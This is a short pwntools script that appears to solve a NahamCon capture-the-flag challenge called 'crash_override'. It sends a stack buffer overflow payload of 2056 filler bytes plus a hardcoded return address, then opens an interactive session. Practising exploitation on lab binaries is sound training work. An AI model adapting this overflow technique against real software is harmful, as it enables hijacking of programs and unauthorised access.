from pwn import *

# r = remote("challenge.nahamcon.com", 30071)

r = process("./crash_override")
gdb.attach(r)

payload = b'a'*2056 + p64(0x0000555555555289)

print(r.recv())

r.sendline(payload)

r.interactive()

